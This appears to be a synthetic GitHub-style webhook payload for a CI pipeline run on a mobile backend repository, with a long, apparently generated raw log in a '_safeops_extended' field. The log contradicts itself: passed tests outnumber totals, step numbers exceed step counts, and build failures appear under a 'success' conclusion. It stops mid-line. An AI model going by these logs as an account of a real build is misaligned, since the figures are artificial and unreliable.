{
  "action": "completed",
  "workflow_run": {
    "id": 761,
    "name": "CI Pipeline",
    "head_branch": "develop",
    "head_sha": "a016c313f4b7afd11e4e64a8411f2c21eaf0d430",
    "status": "completed",
    "conclusion": "success",
    "run_started_at": "2025-12-06T12:19:48.943021Z",
    "updated_at": "2025-12-06T12:24:02.205043Z"
  },
  "repository": {
    "full_name": "startup-io/mobile-backend",
    "name": "mobile-backend"
  },
  "sender": {
    "login": "eve"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: setup_environment ===\n[12:19:48] INFO: Starting build process\nnpm notice: package.json updated\nGET /health - 200 (4ms)\nCompleted.\n[12:19:48] INFO: Cache refreshed\n[12:19:48] DEBUG: Connection pool: 1 active\n[12:19:48] INFO: Starting build process\nPlatform: win32-x64\nEnvironment: production\nLoading...\nCache miss for key-1476\nAlready up to date.\nCompiling src/main.py...\nTests: 121 passed, 121 total\nReady.\n\u2713 Step 'checkout' succeeded\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nArtifact uploaded: dist.zip (10MB)\nFinished.\nTest Suites: 35 passed, 45 total\nSuccess!\nMinifying app.js\nHEAD is now at 4c09fac\n\u2713 Step 'build' succeeded\nFAILED: test_auth_login\nnpm install: resolved 1225 packages\nUploading artifact 'coverage' (48 files)\nHEAD is now at 5f0a376\nReady.\nArtifact uploaded: dist.zip (23MB)\nArtifact downloaded: 12MB\nLayer 10/15: RUN command\nCoverage: 87% statements, 96% branches\nCompiling src/utils.go...\nStep 20/23: Testing\nStep 6/21: Deploying\nStep 3/20: Running migrations\n[12:19:48] DEBUG: Memory usage: 1641MB\nGenerating source maps...\n[12:19:48] DEBUG: Query executed in 84ms\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nArtifact uploaded: dist.zip (93MB)\nInstalling jest@3.16.6\n[12:19:48] DEBUG: Query executed in 36ms\nReady.\nVerifying...\nCompleted.\nSnapshots: 8 passed, 31 total\nEnvironment: test\nFAILED: test_user_create\nBundling runtime.js\nEnvironment: staging\nSwitched to branch 'bugfix/task-882'\nArtifact uploaded: build.tar.gz (19MB)\nCache saved successfully\nOptimizing 81 modules...\n\u2713 Step 'install' succeeded\nAlready up to date.\nStep 18/16: Installing dependencies\nUploading artifact 'dist' (43 files)\n[12:19:48] INFO: Starting build process\n[12:19:48] ERROR: Connection failed\n[12:19:48] DEBUG: Initializing service\n\u2713 test completed\nGET /status - 201 (89ms)\n[12:19:48] DEBUG: Loading configuration\n[12:19:48] DEBUG: Initializing service\npip: Downloading eslint-3.6.tar.gz\nPulling image: node:latest\nStep 4/15: Testing\n\u2713 All checks passed\n[12:19:48] INFO: Processing request\nPlatform: win32-x64\nCompiling components/app.ts...\nDone.\n[12:19:48] WARN: Deprecated API usage\npip: Downloading express-2.12.tar.gz\n\u2717 build failed with exit code 110\nUploading artifact 'coverage' (43 files)\nStep 20/19: Testing\nCompiling lib/service.java...\n[12:19:48] INFO: Connecting to database\nStep 12/25: Building\nOK\nOK\n[12:19:48] WARN: Deprecated API usage\nBuilding Docker image...\nConnection established\nSnapshots: 7 passed, 12 total\n[12:19:48] WARN: Deprecated API usage\nBundling runtime.css\npip: Installing build dependencies...\n[12:19:48] DEBUG: Query executed in 24ms\n\u2717 build failed with exit code 67\nWARNING: jest has known vulnerabilities\nCache invalidated: node_modules\npip: Downloading eslint-5.3.tar.gz\nTLS handshake completed\nCompleted.\nTransforming 250 files...\nPulling image: python:3.11\nStep 18/17: Running migrations\nUsing Python 3.10\nnpm notice: package.json updated\nCache restored successfully (376MB)\nnpm notice: package.json updated\nStep 13/21: Linting\nBuilding Docker image...\n\u2713 lint completed\n[12:19:48] DEBUG: Initializing service\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nWaiting...\n[12:19:48] DEBUG: Initializing service\nCreating production build...\nStep 1/25: Deploying\n[12:19:48] DEBUG: Loading configuration\npip: Collecting lodash\nTransforming 497 files...\nPulling image: python:latest\nBuilding Docker image...\nRan 98 tests in 29s\nWaiting...\nInstalling prettier@1.19.4\n[12:19:48] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:19:48] INFO: Processing request\nArtifact downloaded: 20MB\nRan 55 tests in 20s\n[12:19:48] WARN: Deprecated API usage\nHEAD is now at aa74d28\n[12:19:48] INFO: Cache refreshed\nnpm install: resolved 1016 packages\n\u2713 build completed\nStep 13/20: Linting\nWaiting...\nException: NullPointerException\n\u2713 All checks passed\nCompiling components/utils.go...\nCompiling lib/handler.rs...\nLoading...\nDone.\nCompiling lib/service.java...\npip: Collecting axios\n[12:19:48] DEBUG: Query executed in 2ms\nImage pulled successfully\n\u2717 build failed with exit code 19\nStep 8/21: Installing dependencies\n[12:19:48] DEBUG: Connection pool: 6 active\nCreating production build...\nUsing Node.js 17.20.6\nAlready up to date.\nMinifying vendor.js\nPOST /api - 200 (110ms)\n[12:19:48] INFO: Processing request\nCache hit for key-8275\nSuccess!\nArtifact uploaded: dist.zip (98MB)\nSnapshots: 9 passed, 6 total\npip: Collecting react\nWaiting...\nTest Suites: 24 passed, 50 total\nVerifying...\nStep 14/20: Building\nCompiling components/app.ts...\n\u2713 lint completed\nStep 12/16: Running migrations\nStep 11/15: Running migrations\nAlready up to date.\nChecking out develop branch\n[12:19:48] INFO: Connecting to database\nCache hit for key-4981\nRan 109 tests in 8s\nStep 4/22: Installing dependencies\n\u2713 package completed\nCoverage: 80% statements, 87% branches\n\u2713 Task completed in 2385ms\n[12:19:48] INFO: Starting build process\nStep 1/20: Linting\nCompiling utils/main.py...\nOptimizing 86 modules...\npip: Downloading express-4.3.tar.gz\nConnecting to test.io:443...\nBundling styles.js\nGenerating source maps...\n=== Step setup_environment completed ===\n=== Step: deploy_production ===\n[12:19:48] INFO: Connecting to database\nDone.\nStep 14/23: Deploying\npip: Downloading jest-3.8.tar.gz\nProcessing...\nBuilding Docker image...\nConnecting to startup.dev:443...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:19:48] INFO: Starting build process\nStep 18/24: Linting\nSuccess!\nUsing Python 3.10\nyarn add: Done in 13.4s\nWaiting...\nSnapshots: 43 passed, 50 total\nNODE_ENV=test\nCache invalidated: dependencies\npip: Downloading eslint-4.7.tar.gz\n[12:19:48] INFO: Starting build process\nException: ValueError\nFetching submodules...\nCompleted.\nProcessing...\nCompleted.\nNODE_ENV=test\nStep 9/25: Running migrations\nGenerating source maps...\nWARNING: express has known vulnerabilities\nOptimizing 31 modules...\nCreating production build...\nOK\nException: RuntimeError\n\u2713 All checks passed\nFetching submodules...\nBundling vendor.css\n  PASS: test_db_connect (39ms)\n[12:19:48] DEBUG: Loading configuration\nRan 126 tests in 38s\nLoading...\nSwitched to branch 'feature/task-856'\nPlatform: linux-x64\nConnecting to acme.corp:443...\nDone.\nCache miss for key-1187\nTLS handshake completed\n\u2713 All checks passed\nRan 44 tests in 33s\nCache saved successfully\nOK\nTLS handshake completed\nCache restored successfully (19MB)\nnpm install: resolved 636 packages\nArtifact downloaded: 25MB\nEnvironment: test\nChecking out main branch\nTest Suites: 34 passed, 31 total\nFetching submodules...\nStep 1/18: Installing dependencies\n[12:19:48] WARN: Deprecated API usage\nFAILED: test_db_connect\nyarn add: Done in 28.96s\nStep 1/15: Testing\nCache restored successfully (242MB)\nCache invalidated: build\nyarn add: Done in 14.75s\nBundling vendor.css\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:19:48] WARN: Deprecated API usage\nCompleted.\nCache hit for key-9325\nCompiling components/index.js...\npip: Installing build dependencies...\nEnvironment: staging\nLayer 10/10: RUN command\nTests: 246 passed, 106 total\nAlready up to date.\nOK\nSnapshots: 7 passed, 48 total\nSnapshots: 10 passed, 36 total\nMinifying app.js\n  PASS: unit/test_cache_hit.spec.js\nLayer 1/10: RUN command\nUsing Node.js 17.0.0\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:19:48] INFO: Cache refreshed\nSnapshots: 33 passed, 22 total\n  PASS: unit/test_db_connect.spec.js\nCompiling lib/main.py...\nArtifact uploaded: dist.zip (25MB)\nUploading artifact 'build' (4 files)\nConnection established\n[12:19:48] WARN: Deprecated API usage\nCache miss for key-8553\nVerifying...\nCompleted.\nyarn add: Done in 26.8s\n[12:19:48] WARN: Deprecated API usage\nGenerating source maps...\nCache hit for key-6645\nCache restored successfully (202MB)\npip: Collecting lodash\nEnvironment: development\nLoading...\nCompiling components/app.ts...\nCompleted.\nOptimizing 100 modules...\n\u2713 validate completed\nCompiling lib/utils.go...\nPlatform: win32-x64\nBundling main.css\n[12:19:48] ERROR: Connection failed\n  PASS: integration/test_user_create.spec.js\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCache invalidated: build\nTest Suites: 35 passed, 40 total\nPOST /api - 200 (235ms)\nUsing Node.js 18.13.0\n[12:19:48] WARN: Deprecated API usage\nStep 15/22: Installing dependencies\n  PASS: integration/test_auth_login.spec.js\nSwitched to branch 'bugfix/task-365'\nFAILED: test_user_create\nTime: 42.883s\nTLS handshake completed\nnpm notice: created a lockfile\nCoverage: 98% statements, 93% branches\npip: Downloading axios-5.13.tar.gz\nInstalling webpack@3.19.10\nCache hit for key-1524\n[12:19:48] INFO: Processing request\nConnecting to cloud.services:443...\nTime: 107.562s\n[12:19:48] INFO: Cache refreshed\nReady.\nTLS handshake completed\n[12:19:48] INFO: Connecting to database\npip: Downloading prettier-2.12.tar.gz\nCompiling utils/index.js...\nCompiling utils/index.js...\nPushing to registry...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompiling components/service.java...\nOptimizing 68 modules...\nConnection established\nUploading artifact 'build' (2 files)\nCompiling lib/handler.rs...\nTime: 10.126s\n[12:19:48] WARN: Deprecated API usage\nBundling styles.js\n\u2713 test completed\nVerifying...\nRan 172 tests in 19s\nOptimizing 14 modules...\nWaiting...\nCache saved successfully\nStep 5/20: Deploying\nTLS handshake completed\nPushing to registry...\nNODE_ENV=test\nnpm notice: created a lockfile\nCompleted.\n\u2713 Step 'checkout' succeeded\nBundling runtime.css\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nReady.\nTLS handshake completed\nSwitched to branch 'hotfix/task-509'\nStep 11/17: Linting\nArtifact uploaded: build.tar.gz (12MB)\nCache hit for key-1988\n\u2713 Task completed in 1104ms\n[12:19:48] DEBUG: Memory usage: 1594MB\nTests: 482 passed, 404 total\nCompleted.\n[12:19:48] INFO: Connecting to database\n[12:19:48] DEBUG: Initializing service\nConnecting to startup.dev:443...\n[12:19:48] INFO: Cache refreshed\npip install: Successfully installed express-1.20\nUsing Python 3.11\nSuccess!\nInstalling express@3.4.4\n\u2713 All checks passed\nLoading...\n=== Step deploy_production completed ===\n=== Step: upload_artifacts ===\npip: Installing build dependencies...\nCache miss for key-9452\nPushing to registry...\nPushing to registry...\nFetching submodules...\nSwitched to branch 'hotfix/task-451'\nMinifying vendor.js\nLoading...\nDone.\nBundling runtime.css\n[12:19:48] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nRan 64 tests in 54s\nVerifying...\nCache saved successfully\nEnvironment: development\nArtifact uploaded: dist.zip (37MB)\n[12:19:48] INFO: Starting build process\nArtifact uploaded: build.tar.gz (42MB)\nStep 2/23: Linting\nEnvironment: production\nStep 12/18: Deploying\n\u2713 Step 'checkout' succeeded\nStep 14/22: Building\nStep 11/18: Linting\n[12:19:48] ERROR: Connection failed\nSwitched to branch 'hotfix/task-345'\n[12:19:48] DEBUG: Initializing service\npip: Collecting express\nyarn add: Done in 18.90s\n[12:19:48] INFO: Cache refreshed\nStep 19/17: Installing dependencies\nCache miss for key-5447\npip: Installing build dependencies...\nnpm install: resolved 919 packages\nCompiling lib/handler.rs...\nPushing to registry...\n\u2717 build failed with exit code 29\nSnapshots: 50 passed, 20 total\nWaiting...\nTest Suites: 25 passed, 33 total\nUsing Python 3.12\nSuccess!\nCreating production build...\nStep 17/22: Building\n\u2713 All checks passed\n\u2713 All checks passed\n[12:19:48] INFO: Request completed\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nBundling vendor.js\n\u2713 All checks passed\n\u2713 validate completed\nCompiling components/service.java...\nCreating production build...\nEnvironment: production\nCache miss for key-7876\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nMinifying vendor.js\n\u2713 Step 'test' succeeded\nAlready up to date.\nGenerating source maps...\n[12:19:49] INFO: Connecting to database\nyarn add: Done in 26.44s\n[12:19:49] DEBUG: Loading configuration\nPushing to registry...\nRan 16 tests in 5s\nPushing to registry...\nChecking out master branch\nUsing Python 3.11\nCoverage: 89% statements, 69% branches\nVerifying...\nFetching submodules...\nArtifact uploaded: build.tar.gz (14MB)\nCoverage: 96% statements, 64% branches\n[12:19:49] DEBUG: Memory usage: 1106MB\nnpm notice: created a lockfile\nCache saved successfully\nUsing Python 3.10\nCache miss for key-3221\nCompiling components/service.java...\nTests: 270 passed, 488 total\n[12:19:49] INFO: Cache refreshed\n\u2713 Step 'test' succeeded\n[12:19:49] DEBUG: Memory usage: 1285MB\n\u2713 Step 'install' succeeded\nUploading artifact 'build' (17 files)\nStep 9/21: Testing\nFAILED: test_user_create\n[12:19:49] INFO: Connecting to database\nSnapshots: 33 passed, 34 total\nGET /health - 201 (29ms)\nOK\n[12:19:49] DEBUG: Loading configuration\n[12:19:49] DEBUG: Loading configuration\nReady.\n[12:19:49] INFO: Processing request\nCache hit for key-7899\nNODE_ENV=test\nFinished.\nUsing Python 3.12\nHEAD is now at 3c4ffe4\n[12:19:49] WARN: Deprecated API usage\nBundling styles.css\nSuccess!\nPushing to registry...\n[12:19:49] INFO: Cache refreshed\n[12:19:49] WARN: Deprecated API usage\nBundling runtime.js\n[12:19:49] WARN: Deprecated API usage\nOK\n[12:19:49] INFO: Connecting to database\nEnvironment: production\nStep 18/25: Installing dependencies\nStep 2/22: Running migrations\n[12:19:49] DEBUG: Initializing service\n[12:19:49] INFO: Processing request\nConnecting to startup.dev:443...\n\u2713 All checks passed\n[12:19:49] WARN: Deprecated API usage\nStep 3/20: Deploying\nTests: 217 passed, 193 total\nTLS handshake completed\nCompiling lib/handler.rs...\nConnection established\nSwitched to branch 'hotfix/task-246'\n\u2717 build failed with exit code 104\n\u2713 Task completed in 1116ms\n[12:19:49] DEBUG: Connection pool: 11 active\nCache saved successfully\nChecking out main branch\nArtifact uploaded: build.tar.gz (33MB)\n[12:19:49] DEBUG: Loading configuration\nNODE_ENV=test\nnpm notice: created a lockfile\nInstalling react@1.7.10\nSuccess!\nAlready up to date.\nProcessing...\nOK\n  PASS: integration/test_auth_login.spec.js\nStep 17/24: Linting\nPushing to registry...\nProcessing...\nImage pulled successfully\nBundling runtime.js\n[12:19:49] DEBUG: Loading configuration\nnpm install: resolved 170 packages\nMinifying main.js\nPulling image: python:latest\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nTransforming 414 files...\nUsing Node.js 16.6.5\nCache invalidated: build\npip: Downloading jest-2.15.tar.gz\nConnecting to example.com:443...\nArtifact uploaded: dist.zip (13MB)\nnpm notice: created a lockfile\nUsing Python 3.11\nAlready up to date.\nChecking out develop branch\nMinifying vendor.js\npip: Downloading prettier-3.13.tar.gz\n\u2713 Step 'checkout' succeeded\n[12:19:49] INFO: Request completed\nTest Suites: 16 passed, 23 total\nStep 12/16: Building\n\u2713 lint completed\nDone.\nnpm install: added 295 packages\nStep 14/25: Installing dependencies\n[12:19:49] INFO: Connecting to database\n\u2713 All checks passed\nChecking out develop branch\n[12:19:49] DEBUG: Memory usage: 1059MB\nTransforming 947 files...\nTLS handshake completed\nPlatform: darwin-arm64\nCache invalidated: node_modules\nEnvironment: staging\nTransforming 650 files...\nCompiling src/service.java...\nCoverage: 71% statements, 92% branches\nStep 4/19: Installing dependencies\npip: Downloading prettier-1.8.tar.gz\n=== Step upload_artifacts completed ===\n=== Step: restore_cache ===\n\u2713 Task completed in 3832ms\npip: Collecting jest\nBuilding Docker image...\n\u2713 Step 'build' succeeded\n\u2713 All checks passed\npip: Installing build dependencies...\nStep 11/17: Building\nCache hit for key-5834\nUsing Python 3.10\nUploading artifact 'dist' (3 files)\nnpm notice: package.json updated\nTests: 334 passed, 265 total\nCache invalidated: build\nOK\nPOST /upload - 200 (97ms)\n  PASS: e2e/test_db_connect.spec.js\nPlatform: darwin-arm64\nChecking out master branch\nCompleted.\nSnapshots: 27 passed, 21 total\nArtifact uploaded: build.tar.gz (22MB)\n[12:19:49] DEBUG: Query executed in 72ms\nMinifying app.js\nCache saved successfully\n[12:19:49] INFO: Starting build process\nFinished.\nImage pulled successfully\nnpm install: added 360 packages\nnpm install: added 415 packages\nCompiling src/main.py...\nStep 1/15: Running migrations\nUsing Node.js 14.8.4\n\u2713 Task completed in 2930ms\n  PASS: test_db_connect (247ms)\nBuilding Docker image...\nPOST /upload - 201 (69ms)\nArtifact downloaded: 1MB\nUploading artifact 'coverage' (47 files)\nArtifact uploaded: build.tar.gz (40MB)\nCache hit for key-3852\n[12:19:49] WARN: Deprecated API usage\nWARNING: webpack has known vulnerabilities\nSuccess!\nnpm install: resolved 1980 packages\n[12:19:49] INFO: Processing request\nDone.\nImage pulled successfully\nImage pulled successfully\nChecking out master branch\nCompiling src/utils.go...\n[12:19:49] WARN: Deprecated API usage\nReady.\nMinifying app.js\nOptimizing 96 modules...\nTransforming 436 files...\n\u2713 Step 'setup' succeeded\nCache miss for key-5391\nStep 5/25: Deploying\n\u26a0 DEPRECATION: Feature will be removed in v5.0\npip: Collecting express\nMinifying vendor.js\nFetching submodules...\n[12:19:49] INFO: Starting build process\nInstalling express@1.19.8\nArtifact uploaded: build.tar.gz (46MB)\nCompiling components/utils.go...\nStep 7/22: Deploying\nUsing Python 3.10\nStep 15/16: Testing\nFinished.\nUsing Node.js 17.14.10\nOptimizing 63 modules...\nBuilding Docker image...\n[12:19:49] INFO: Cache refreshed\n[12:19:49] DEBUG: Memory usage: 1037MB\nCache saved successfully\nPlatform: win32-x64\nCache invalidated: build\nPulling image: alpine:18\nLayer 2/10: RUN command\nCompleted.\nArtifact uploaded: build.tar.gz (32MB)\nFetching submodules...\nSnapshots: 1 passed, 18 total\nFinished.\nCreating production build...\nChecking out master branch\nCompiling utils/index.js...\nWARNING: jest has known vulnerabilities\n[12:19:49] DEBUG: Memory usage: 1798MB\nNODE_ENV=development\nCache hit for key-1354\nTest Suites: 10 passed, 16 total\nNODE_ENV=production\nWARNING: lodash has known vulnerabilities\nTransforming 731 files...\nConnecting to startup.dev:443...\n\u2713 All checks passed\n  PASS: unit/test_db_connect.spec.js\nUsing Node.js 16.14.5\nGenerating source maps...\nImage pulled successfully\nOptimizing 69 modules...\nStep 10/25: Installing dependencies\nChecking out master branch\n[12:19:49] DEBUG: Initializing service\nMinifying main.js\nyarn add: Done in 17.13s\n[12:19:49] INFO: Processing request\nSuccess!\nGET /status - 204 (74ms)\nWARNING: express has known vulnerabilities\nGET /health - 201 (1ms)\n[12:19:49] INFO: Request completed\nVerifying...\nCompiling utils/main.py...\nSwitched to branch 'hotfix/task-239'\nStep 1/15: Linting\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:19:49] INFO: Processing request\nnpm notice: created a lockfile\nPlatform: linux-x64\n[12:19:49] DEBUG: Query executed in 80ms\nSnapshots: 3 passed, 9 total\nnpm install: added 262 packages\nLayer 2/8: RUN command\nTests: 350 passed, 105 total\nCache hit for key-2282\nOK\n[12:19:49] INFO: Request completed\nTransforming 267 files...\nArtifact downloaded: 43MB\nFAILED: test_auth_login\npip: Downloading axios-1.9.tar.gz\nTLS handshake completed\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:19:49] DEBUG: Memory usage: 1277MB\nWARNING: express has known vulnerabilities\nStep 20/20: Installing dependencies\nPOST /api - 200 (396ms)\nPOST /upload - 202 (57ms)\npip: Installing build dependencies...\nnpm notice: package.json updated\n\u2713 All checks passed\n[12:19:49] DEBUG: Query executed in 15ms\nGenerating source maps...\nyarn add: Done in 7.89s\nArtifact downloaded: 26MB\nStep 3/15: Running migrations\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nOptimizing 13 modules...\nCompiling lib/handler.rs...\nProcessing...\nCreating production build...\nCache restored successfully (260MB)\n[12:19:49] INFO: Processing request\nUsing Python 3.10\nUsing Python 3.11\n[12:19:49] DEBUG: Connection pool: 11 active\nSuccess!\n[12:19:49] DEBUG: Loading configuration\n  PASS: integration/test_auth_login.spec.js\nOptimizing 50 modules...\nCache saved successfully\nCoverage: 99% statements, 93% branches\nChecking out main branch\nPulling image: node:18\n[12:19:49] DEBUG: Initializing service\nPushing to registry...\nWARNING: react has known vulnerabilities\nCoverage: 89% statements, 76% branches\n[12:19:49] INFO: Request completed\n[12:19:49] INFO: Cache refreshed\n\u2717 build failed with exit code 8\nInstalling prettier@3.9.4\nStep 16/22: Deploying\nConnection established\nOptimizing 95 modules...\nConnection established\nReady.\nNODE_ENV=test\n[12:19:49] INFO: Starting build process\nOK\nBundling runtime.css\n=== Step restore_cache completed ===\n=== Step: checkout ===\nOK\n[12:19:49] WARN: Deprecated API usage\n[12:19:49] ERROR: Connection failed\nCreating production build...\nCache saved successfully\nWARNING: jest has known vulnerabilities\nConnecting to test.io:443...\nPulling image: alpine:latest\nCompiling components/utils.go...\nnpm notice: created a lockfile\n  PASS: test_user_create (257ms)\n[12:19:49] INFO: Connecting to database\nCompiling components/utils.go...\n  PASS: test_auth_login (481ms)\n[12:19:49] DEBUG: Initializing service\nCreating production build...\nUploading artifact 'dist' (39 files)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nPushing to registry...\nCompiling utils/main.py...\nEnvironment: staging\nSnapshots: 29 passed, 23 total\n  PASS: test_user_create (270ms)\nCompiling components/app.ts...\nProcessing...\nStep 15/25: Linting\nCache miss for key-1454\nCompiling lib/main.py...\npip: Downloading webpack-3.1.tar.gz\nWaiting...\nTest Suites: 38 passed, 29 total\nReady.\npip: Downloading prettier-1.4.tar.gz\nAlready up to date.\nHEAD is now at 2e52a8d\nStep 15/21: Installing dependencies\nCache restored successfully (69MB)\nCompiling utils/service.java...\n[12:19:49] INFO: Cache refreshed\nFinished.\n[12:19:49] INFO: Request completed\nPOST /data - 202 (79ms)\nCompiling lib/app.ts...\nWARNING: jest has known vulnerabilities\nHEAD is now at 4b61ea1\nVerifying...\nOptimizing 82 modules...\nCompiling lib/index.js...\n\u2713 validate completed\n\u2713 All checks passed\n[12:19:49] DEBUG: Query executed in 38ms\n[12:19:49] INFO: Cache refreshed\n[12:19:49] WARN: Deprecated API usage\nImage pulled successfully\nException: ValueError\nPulling image: alpine:3.11\nWARNING: prettier has known vulnerabilities\npip: Downloading webpack-5.9.tar.gz\n[12:19:49] WARN: Deprecated API usage\npip: Collecting express\nStep 13/16: Deploying\nImage pulled successfully\nVerifying...\nStep 9/22: Deploying\n[12:19:49] DEBUG: Memory usage: 527MB\nStep 17/18: Linting\nTest Suites: 41 passed, 20 total\n\u2717 build failed with exit code 111\nNODE_ENV=production\n\u2713 Task completed in 4262ms\nSnapshots: 40 passed, 32 total\nFetching submodules...\n  PASS: test_auth_login (94ms)\nHEAD is now at bedec57\nFetching submodules...\nCompiling lib/handler.rs...\nSnapshots: 29 passed, 30 total\nTLS handshake completed\nWARNING: lodash has known vulnerabilities\npip: Collecting prettier\nNODE_ENV=development\nNODE_ENV=production\nyarn add: Done in 7.76s\nCoverage: 74% statements, 75% branches\nUsing Python 3.10\nRan 75 tests in 10s\nAlready up to date.\nConnecting to startup.dev:443...\nFinished.\nCache restored successfully (54MB)\nProcessing...\npip: Downloading express-3.14.tar.gz\n[12:19:49] DEBUG: Initializing service\npip: Installing build dependencies...\n\u2713 Task completed in 4042ms\nTests: 281 passed, 263 total\nPlatform: win32-x64\nSwitched to branch 'feature/task-424'\nCompiling lib/utils.go...\n[12:19:49] INFO: Connecting to database\nSwitched to branch 'hotfix/task-447'\n\u2713 test completed\nCompiling src/handler.rs...\n[12:19:49] DEBUG: Loading configuration\nCache hit for key-3555\nLayer 6/13: COPY command\nOK\nWARNING: react has known vulnerabilities\nFAILED: test_db_connect\nInstalling express@3.15.6\nPOST /upload - 202 (383ms)\nImage pulled successfully\n[12:19:49] INFO: Starting build process\nHEAD is now at 5cfb360\nUsing Python 3.12\nyarn add: Done in 10.29s\nReady.\n\u2713 Task completed in 4143ms\npip: Collecting prettier\nPulling image: alpine:18\nDone.\nRan 187 tests in 59s\nArtifact uploaded: dist.zip (71MB)\n[12:19:49] WARN: Deprecated API usage\n[12:19:49] DEBUG: Memory usage: 1577MB\nTransforming 488 files...\nCache invalidated: build\nUsing Python 3.11\nStep 7/25: Testing\nTLS handshake completed\n[12:19:49] ERROR: Connection failed\n[12:19:49] INFO: Connecting to database\nCompiling utils/index.js...\nWARNING: lodash has known vulnerabilities\nTime: 57.422s\nTest Suites: 50 passed, 18 total\nArtifact downloaded: 9MB\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n  PASS: integration/test_auth_login.spec.js\n[12:19:49] DEBUG: Connection pool: 4 active\n[12:19:49] DEBUG: Connection pool: 14 active\nEnvironment: test\npip install: Successfully installed axios-1.14\nOK\nnpm install: added 11 packages\nCache invalidated: build\nCompiling utils/service.java...\n[12:19:49] INFO: Cache refreshed\nCompleted.\nStep 18/21: Deploying\nBundling styles.css\nInstalling jest@2.15.2\nUsing Python 3.10\n[12:19:49] INFO: Connecting to database\nnpm install: added 236 packages\nImage pulled successfully\n[12:19:49] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCache miss for key-8656\nPulling image: node:18\n\u2717 build failed with exit code 28\nWARNING: jest has known vulnerabilities\npip: Collecting axios\nTransforming 993 files...\nStep 10/21: Testing\npip: Downloading eslint-3.8.tar.gz\npip install: Successfully installed jest-3.0\n  PASS: e2e/test_api_health.spec.js\n[12:19:49] INFO: Request completed\nGET /status - 204 (84ms)\nPulling image: python:18\nMinifying main.js\npip: Downloading jest-3.11.tar.gz\nnpm install: resolved 1673 packages\nCoverage: 93% statements, 82% branches\nOptimizing 98 modules...\nWaiting...\nGenerating source maps...\nCoverage: 75% statements, 65% branches\nCache hit for key-3222\nCompiling src/index.js...\nArtifact downloaded: 15MB\nCache miss for key-2596\nStep 17/19: Deploying\n=== Step checkout completed ===\n=== Step: integration_tests ===\nCreating production build...\nTLS handshake completed\nBuilding Docker image...\nnpm notice: package.json updated\nOK\nConnection established\nCompiling src/service.java...\n[12:19:49] DEBUG: Query executed in 63ms\npip install: Successfully installed axios-2.17\nTLS handshake completed\nnpm install: added 10 packages\n[12:19:49] INFO: Cache refreshed\nUsing Python 3.11\nNODE_ENV=development\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCompleted.\nCoverage: 100% statements, 96% branches\nBundling styles.js\npip install: Successfully installed react-3.6\nConnecting to acme.corp:443...\nTests: 117 passed, 476 total\nCache saved successfully\nCreating production build...\nnpm install: added 359 packages\nnpm install: added 29 packages\nCoverage: 91% statements, 79% branches\nCompiling lib/index.js...\nWARNING: react has known vulnerabilities\nTLS handshake completed\nTests: 140 passed, 131 total\n[12:19:49] INFO: Cache refreshed\nLayer 8/11: COPY command\n\u2717 build failed with exit code 88\nCache miss for key-8454\n[12:19:49] DEBUG: Initializing service\nWaiting...\nCompiling lib/index.js...\nException: TypeError\nStep 8/18: Linting\nNODE_ENV=test\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:19:49] DEBUG: Memory usage: 189MB\nVerifying...\n[12:19:49] WARN: Deprecated API usage\nRan 80 tests in 20s\nFinished.\n[12:19:49] WARN: Deprecated API usage\nMinifying app.js\npip: Downloading express-2.11.tar.gz\nWARNING: express has known vulnerabilities\nInstalling eslint@1.15.9\nPushing to registry...\nCompleted.\nCompiling utils/index.js...\nStep 3/19: Installing dependencies\npip: Collecting webpack\nUsing Python 3.12\nLoading...\nStep 2/23: Linting\nImage pulled successfully\nCache restored successfully (267MB)\nCompiling lib/service.java...\nMinifying main.js\nStep 15/23: Installing dependencies\n\u2713 deploy completed\nOptimizing 21 modules...\nCompiling lib/index.js...\nMinifying vendor.js\nCoverage: 85% statements, 61% branches\nUploading artifact 'dist' (10 files)\nTLS handshake completed\nChecking out master branch\nVerifying...\nCompiling src/handler.rs...\nNODE_ENV=test\n[12:19:49] WARN: Deprecated API usage\nArtifact downloaded: 48MB\nCreating production build...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:19:49] DEBUG: Initializing service\nNODE_ENV=test\nPushing to registry...\nTime: 34.234s\nyarn add: Done in 8.62s\nyarn add: Done in 2.28s\nTransforming 570 files...\n\u2713 All checks passed\nImage pulled successfully\nyarn add: Done in 20.58s\nnpm install: added 385 packages\nArtifact downloaded: 48MB\nConnection established\nLoading...\nLoading...\n[12:19:49] DEBUG: Connection pool: 13 active\nArtifact uploaded: dist.zip (67MB)\n[12:19:49] DEBUG: Query executed in 73ms\nCoverage: 96% statements, 75% branches\nArtifact uploaded: build.tar.gz (19MB)\npip install: Successfully installed lodash-2.0\nHEAD is now at ec4fdc2\nFinished.\n\u2713 Step 'checkout' succeeded\nnpm install: added 268 packages\nCompiling utils/handler.rs...\nConnecting to acme.corp:443...\nCompleted.\nFAILED: test_db_connect\nFinished.\nCache invalidated: build\nAlready up to date.\n[12:19:49] WARN: Deprecated API usage\nCompiling components/utils.go...\nCompiling utils/main.py...\n  PASS: e2e/test_db_connect.spec.js\nWaiting...\nStep 17/20: Running migrations\n[12:19:49] WARN: Deprecated API usage\nReady.\n[12:19:49] DEBUG: Connection pool: 11 active\nTime: 90.32s\nInstalling prettier@1.19.1\nMinifying vendor.js\nStep 11/24: Installing dependencies\n\u2717 build failed with exit code 52\nCompiling components/service.java...\nFinished.\nInstalling 